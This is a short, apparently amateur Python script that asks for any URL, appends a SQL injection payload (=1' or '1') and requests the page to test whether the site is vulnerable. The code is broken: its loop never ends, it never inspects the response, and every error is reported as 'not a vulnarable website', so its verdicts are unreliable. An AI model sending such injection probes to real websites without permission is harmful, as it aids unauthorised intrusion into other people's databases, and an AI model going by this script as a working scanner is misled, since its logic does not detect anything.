#! /usr/bin/python
import sys
import urllib.request
url=input("please enter a url to test:")
i=1
while i:
 try: 
  res=urllib.request.urlopen(url + "=1\' or \'1\'")
  part=res.read()
  body=part.decode('utf-8')
 except:
  print ("not a vulnarable website")
  sys.exit()
